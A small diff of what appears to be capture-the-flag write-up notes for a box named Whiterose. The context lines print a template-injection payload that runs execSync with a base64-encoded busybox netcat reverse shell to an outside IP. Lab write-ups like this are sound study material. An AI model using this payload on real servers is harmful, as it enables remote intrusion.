@@ -193,9 +193,8 @@ Jemmy Laurel:
 ```js
 &settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4yMS4xNTQuMTQ1IDEzMzcgLWUgc2g= | base64 -d | bash"');//
 ```
-<br>
+- HELLLLLLLLLLLLLLLLLLLL YEEAAAAAAAAAHHHHHHHHHHHH <br>
 ![[WhiteroseGotShell.png]] <br>
-- HELLLLLLLLLLLLLLLLLLLL YEEAAAAAAAAAHHHHHHHHHHHH
 - `user.txt`:
 	
 ```
